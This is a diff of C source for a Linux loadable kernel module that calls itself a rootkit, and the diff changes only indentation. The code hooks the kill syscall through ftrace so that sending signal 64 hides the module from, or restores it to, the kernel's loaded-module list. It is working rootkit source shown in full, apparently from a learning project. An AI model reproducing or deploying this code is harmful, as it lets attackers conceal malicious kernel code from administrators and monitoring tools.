@@ -38,28 +38,28 @@ static asmlinkage long (*orig_kill)(const struct pt_regs *);
  * syscall with the arguments passed via pt_regs. */
 asmlinkage int hook_kill(const struct pt_regs *regs)
 {
-	void showme(void);
-	void hideme(void);
+    void showme(void);
+    void hideme(void);
 
-	// pid_t pid = regs->di;
-	int sig = regs->si;
+    // pid_t pid = regs->di;
+    int sig = regs->si;
 
-	if ( (sig == 64) && (hidden == 0) )
-	{
-		printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
-		hideme();
-		hidden = 1;
-	}
-	else if ( (sig == 64) && (hidden == 1) )
-	{
-		printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
-		showme();
-		hidden = 0;
-	}
-	else
-	{
-		return orig_kill(regs);
-	}
+    if ( (sig == 64) && (hidden == 0) )
+    {
+        printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
+        hideme();
+        hidden = 1;
+    }
+    else if ( (sig == 64) && (hidden == 1) )
+    {
+        printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
+        showme();
+        hidden = 0;
+    }
+    else
+    {
+        return orig_kill(regs);
+    }
 }
 #else
 /* This is the old way of declaring a syscall hook */
@@ -67,25 +67,25 @@ static asmlinkage long (*orig_kill)(pid_t pid, int sig);
 
 static asmlinkage int hook_kill(pid_t pid, int sig)
 {
-	void showme(void);
-	void hideme(void);
+    void showme(void);
+    void hideme(void);
 
-	if ( (sig == 64) && (hidden == 0) )
-	{
-		printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
-		hideme();
-		hidden = 1;
-	}
-	else if ( (sig == 64) && (hidden == 1) )
-	{
-		printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
-		showme();
-		hidden = 0;
-	}
-	else
-	{
-		return orig_kill(pid, sig);
-	}
+    if ( (sig == 64) && (hidden == 0) )
+    {
+        printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
+        hideme();
+        hidden = 1;
+    }
+    else if ( (sig == 64) && (hidden == 1) )
+    {
+        printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
+        showme();
+        hidden = 0;
+    }
+    else
+    {
+        return orig_kill(pid, sig);
+    }
 }
 #endif
 
@@ -93,7 +93,7 @@ static asmlinkage int hook_kill(pid_t pid, int sig)
  * specified by prev_module */
 void showme(void)
 {
-	list_add(&THIS_MODULE->list, prev_module);
+    list_add(&THIS_MODULE->list, prev_module);
 }
 
 /* Record where we are in the loaded module list by storing
@@ -101,34 +101,34 @@ void showme(void)
  * from the list */
 void hideme(void)
 {
-	prev_module = THIS_MODULE->list.prev;
-	list_del(&THIS_MODULE->list);
+    prev_module = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
 }
 
 /* Declare the struct that ftrace needs to hook the syscall */
 static struct ftrace_hook hooks[] = {
-	HOOK("sys_kill", hook_kill, &orig_kill),
+    HOOK("sys_kill", hook_kill, &orig_kill),
 };
 
 /* Module initialization function */
 static int __init rootkit_init(void)
 {
-	/* Hook the syscall and print to the kernel buffer */
-	int err;
-	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
-	if(err)
-		return err;
+    /* Hook the syscall and print to the kernel buffer */
+    int err;
+    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+    if(err)
+        return err;
 
-	printk(KERN_INFO "rootkit: Loaded >:-)\n");
+    printk(KERN_INFO "rootkit: Loaded >:-)\n");
 
-	return 0;
+    return 0;
 }
 
 static void __exit rootkit_exit(void)
 {
-	/* Unhook and restore the syscall and print to the kernel buffer */
-	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
-	printk(KERN_INFO "rootkit: Unloaded :-(\n");
+    /* Unhook and restore the syscall and print to the kernel buffer */
+    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+    printk(KERN_INFO "rootkit: Unloaded :-(\n");
 }
 
 module_init(rootkit_init);
